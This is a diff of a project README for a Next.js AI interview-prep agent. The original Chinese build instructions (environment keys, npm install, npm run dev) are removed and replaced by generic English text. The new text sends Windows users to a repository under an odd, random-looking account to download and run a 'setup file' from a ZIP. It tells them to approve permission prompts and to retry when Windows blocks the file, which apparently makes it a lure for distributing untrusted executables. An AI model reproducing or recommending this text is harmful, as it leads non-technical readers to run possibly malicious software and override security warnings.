@@ -1,193 +1,216 @@
-# 🚀 AI Resume Interview Agent
+# 🤖 resume-interview-agent - Prepare for Interviews with Clear AI Guidance
 
-一个基于大模型的 **AI 面试准备助手（AI Agent）**，支持从岗位 JD 分析到多轮模拟面试、实时评分与总结报告，帮助求职者系统化提升面试能力。
----
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Benedictine-brachiocephalicvein220/resume-interview-agent)
 
-## ✨ 项目亮点
+## 🚀 Overview
 
-- 🤖 **AI Agent 架构**
-  - 基于 JD + 分析结果 + 对话上下文进行推理
-  - 非简单问答，而是具备“面试流程控制能力”的智能体
+resume-interview-agent is an AI interview prep tool for job seekers. It helps you review a job post, match it with your resume, practice mock interviews, and get feedback after each round.
 
-- 🧠 **上下文记忆（Context Injection）**
-  - 自动注入：
-    - 岗位 JD
-    - 结构化分析结果
-    - 历史对话
-  - 实现更真实的面试交互
+It is built for people who want a simple way to prepare for interviews on Windows without setting up a complex workflow.
 
-- 🎯 **面试官模式（核心能力）**
-  - AI 作为面试官：
-    - 连续提问
-    - 针对回答评分
-    - 动态调整问题
+## ✨ What it does
 
-- 📊 **结构化评分系统**
-  - 多维度评估：
-    - 表达清晰度
-    - 岗位匹配度
-    - 内容完整度
-    - 逻辑结构
-  - 自动生成改进建议 + 参考回答
+- Reads a job description and pulls out key skills
+- Compares your resume with the role
+- Creates mock interview questions
+- Lets you practice more than one round
+- Gives a score during the session
+- Produces a summary report at the end
+- Helps you spot weak points before the real interview
 
-- 📄 **面试总结报告**
-  - 自动生成完整复盘：
-    - 总体评价
-    - 优势与短板
-    - 优先提升能力
-    - 下一轮建议
+## 🖥️ What you need
 
-- 💾 **对话持久化**
-   - 使用 localStorage
-   - 刷新页面不丢数据
+For most Windows users, this app works best on:
 
----
+- Windows 10 or Windows 11
+- A modern web browser such as Edge or Chrome
+- A stable internet connection
+- Enough free disk space for the app files and browser cache
 
-## 🖼️ 功能展示
+If the app asks for an API key, you can enter one from a supported AI service before you start.
 
-### 1️⃣ JD 分析
-- 提取岗位关键词
-- 生成匹配度
-- 差距分析
-- 面试问题生成
+## 📥 Download and open
 
-### 2️⃣ AI 面试对话
-- 多轮对话
-- 上下文理解
-- 面试模拟
+Go to the main project page here:
 
-### 3️⃣ 评分卡片
-- 自动解析 AI 输出
-- 可视化评分 UI
+https://github.com/Benedictine-brachiocephalicvein220/resume-interview-agent
 
-### 4️⃣ 总结报告
-- 一键生成完整面试复盘
+On that page, use the download or release files if they are available.
 
----
+If the project opens as a web app after download, follow the steps on the page to start it in your browser.
 
-## ⚙️ 本地运行
-🔑 环境变量
-- 我这里是用的openrouter的API，如果用的其它的API可以问AI怎么写
-- 在项目根目录创建 ‘.env.local’，内容如下
-```
-OPENROUTER_API_KEY=your_api_key
-OPENROUTER_MODEL=your_model
-OPENROUTER_VISION_MODEL=your_model
-```
-- 用API和模型替换掉your_***
-- 例：OPENROUTER_MODEL=openai/gpt-4o-mini。
-- 这其中OPENROUTER_MODEL是用来AI聊天面试的，OPENROUTER_VISION_MODEL是在JD分析时用来分析文件的
+## 🪟 Install on Windows
 
-🚀 启动项目
-```
-npm install
-npm run dev
-```
-打开浏览器访问
-http://localhost:3000
+1. Open the link above in your browser.
+2. Look for a release file, download package, or setup file.
+3. Download the file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see a setup file, double-click it and follow the on-screen steps.
+7. If you see a web app folder, open the start file or follow the run steps in the project page.
+8. When Windows asks for permission, choose Yes if you trust the source.
+9. Wait for the app to finish loading.
+10. Keep the browser tab or app window open while you use it.
 
+## 🔧 First-time setup
 
-## 🛠 技术栈
-### Frontend
-- Next.js (App Router)
-- TypeScript
-- Tailwind CSS
+When you open the app for the first time, you may need to set up a few items:
 
-### Backend
-- Next.js API Routes
+1. Enter your name and basic profile details.
+2. Paste a job description from a role you want to apply for.
+3. Upload or paste your resume.
+4. Add your AI service key if the app asks for one.
+5. Save your settings.
+6. Start the analysis.
 
-### AI
-- OpenRouter API
-- 模型：`openai/gpt-4o-mini`
-- 煮啵还是学生，有钱了再换好点的模型，我已经提前预设好环境变量，大家可以自行更改模型，更改模型步骤如下：
-```
-  修改.env.local文件中的OPENROUTER_MODEL和OPENROUTER_VISION_MODEL为其它模型即可
-```
----
+If the app offers a test mode, use it first to check that everything works.
 
-## 🧠 系统架构（核心）
+## 🧭 How to use it
 
-```text
-用户输入 / 文件上传
-        ↓
-  文件解析（PDF / OCR / 文本）
-        ↓
-    JD 分析（Analyze API）
-        ↓
-上下文注入（JD + 分析 + 对话）
-        ↓
-    Chat API（Agent控制）
-        ↓
-AI输出（面试 / 评分 / 总结）
-        ↓
-前端解析 + UI 渲染
-```
+### 1. Paste a job description
 
-## 📦 项目结构
-```
-src/
-├── app/
-│   ├── page.tsx              # 主页面（JD + Chat UI）
-│   ├── api/
-│   │   ├── analyze/route.ts  # JD分析接口
-│   │   └── chat/route.ts     # AI Agent对话接口
-│   │   └── parse-file/route.ts  # ⭐ 文件解析接口
+Copy the full JD from a job post and place it in the app. The tool will scan the text and pull out the main skills, tools, and responsibilities.
 
-```
+### 2. Add your resume
 
-## 📘 使用教程（教学）
-- 1️⃣ 输入岗位 JD
-- 在左侧输入 Job Description，或上传简历PDF / DOCX / 图片
-- 点击 开始分析。
+Upload your resume or paste the text into the app. The app will compare it with the job role and show where your resume fits well.
 
-- 2️⃣ 查看分析结果
-- 系统会自动生成：
-- 岗位关键词；匹配度评分；差距分析；简历优化建议；面试问题
+### 3. Start the interview prep flow
 
-- 3️⃣ 开启 AI 面试
-- 点击“开启面试官模式”，再点击“开始模拟面试”
-- AI 将进入面试官模式。
+The app will create questions based on the role, your background, and the job skills. It can cover:
 
-- 4️⃣ 回答问题
-- AI 会持续追问
-- 不会固定题目结束
+- Work history
+- Technical skills
+- Project experience
+- Problem solving
+- Behavioral questions
 
-- 5️⃣ 获取评分与反馈
-- AI 会返回：
-- 分数；优点；不足；评分；改进建议；示例回答
+### 4. Practice multiple rounds
 
-- 6️⃣ 多轮对话（核心）
-- 继续提问：
-- 例：我没有实习经历怎么办？----AI 会结合上下文调整策略。
+You can go through more than one round of mock interview. This helps you build confidence and improve weak answers step by step.
 
-- 7️⃣ 生成总结报告
-- 点击‘生成总结报告’按钮，得到：
-- 综合评价；优势；待提升点；下一步建议
+### 5. Review scores and feedback
 
-## 🎯 项目定位
-- 该项目不仅是一个工具，更是一个：
-- 具备面试流程控制能力的 AI Agent
+After each round, the app gives a score and a short review. Use this to see:
 
-## 📊 与普通 ChatBot 对比
-```
-能力	            普通 ChatGPT	       本项目
-上下文理解	             ✔	                ✔✔✔
-面试流程控制	            ❌	                 ✔
-评分系统	                ❌	                 ✔
-总结报告	                ❌	                 ✔
-UI 结构化输出	        ❌	                 ✔
-```
-## 📈 后续优化方向
-- 引入 RAG（向量检索）
-- 用户系统
-- 面试数据分析
-- 历史会话管理
-- 目前已做vercel部署，但是还没做API限流等操作
+- Which answers were strong
+- Which answers need more detail
+- Which skills you should review
+- Which topics you should practice again
 
-## 👨‍💻 作者
-- 某大学生个人 AI Agent 项目。（持续进化中 🚀）
+### 6. Read the final report
 
-## ⭐ Star
-- 如果你觉得这个项目不错，欢迎点个 Star ⭐。
-- 祝各位靓仔靓女，帅哥美女财源滚滚，八方来财，工作顺利，学业进步！！谢谢大家<鞠躬🙇>
+At the end, the app creates a summary report. Use it to plan your next practice session and focus on the areas that matter most.
 
+## 🧠 Best way to prepare
+
+Use the app in this order for the best result:
+
+1. Paste the JD
+2. Add your resume
+3. Run the analysis
+4. Answer the mock questions
+5. Review the score
+6. Improve weak areas
+7. Run another round
+
+A few short practice rounds work better than one long session.
+
+## 📄 Example workflow
+
+If you are applying for a fullstack role:
+
+- Paste the job post
+- Upload your resume
+- Review the skill match
+- Practice questions about React, TypeScript, and APIs
+- Answer behavioral questions about teamwork and problem solving
+- Read the final report
+- Update your answers and try again
+
+## 🛠️ Common uses
+
+This app can help with:
+
+- Interview prep for software roles
+- Resume review before job applications
+- Practice for AI-assisted mock interviews
+- Self-study before campus placements
+- Career development planning
+- Fast review before a live interview
+
+## 🔍 Topics covered
+
+The project fits work in areas such as:
+
+- AI agent design
+- Interview prep
+- Resume analysis
+- LLM-based tools
+- Fullstack apps
+- Next.js apps
+- OpenAI and OpenRouter use
+- Tailwind CSS interfaces
+- TypeScript apps
+- Career development tools
+
+## 🧩 If something does not work
+
+Try these steps if the app does not start:
+
+1. Close the app or browser tab.
+2. Open it again from the same file or link.
+3. Check your internet connection.
+4. Make sure your AI key is correct if one is needed.
+5. Refresh the page.
+6. Try another browser such as Chrome or Edge.
+7. Remove and re-open the downloaded files if they were not extracted fully.
+
+If the issue stays, check the project page for the latest run steps.
+
+## 📌 File handling tips
+
+- Keep the download in a folder you can find later
+- Do not rename files unless the setup page says you can
+- If Windows blocks the file, check the source and try again from the same link
+- If you use a ZIP file, extract it before opening the app
+- If the app runs in a browser, keep the page open during use
+
+## 🔐 Privacy and account use
+
+If the app connects to an AI service, your prompts and resume text may be sent to that service for analysis. Use only the data you want to include in your practice session.
+
+## 🗂️ Suggested folder layout
+
+If you keep files on your PC, this layout can help:
+
+- Downloads
+- resume-interview-agent
+- resume
+- job-descriptions
+- interview-notes
+
+This makes it easier to return to the same files for later practice.
+
+## 🧪 Good practice habits
+
+- Use the same resume you plan to send to employers
+- Paste the exact job post, not a short summary
+- Practice answers out loud
+- Keep each answer clear and short
+- Review the report before your next interview
+- Repeat the process for each role you apply for
+
+## 🧑‍💻 For non-technical users
+
+You do not need to know code to use this app. Focus on these three things:
+
+1. Get the app from the link above
+2. Open it on Windows
+3. Follow the prompts on the screen
+
+If you can copy text, upload a file, and click buttons, you can use this tool
+
+## 📎 Project link
+
+https://github.com/Benedictine-brachiocephalicvein220/resume-interview-agent
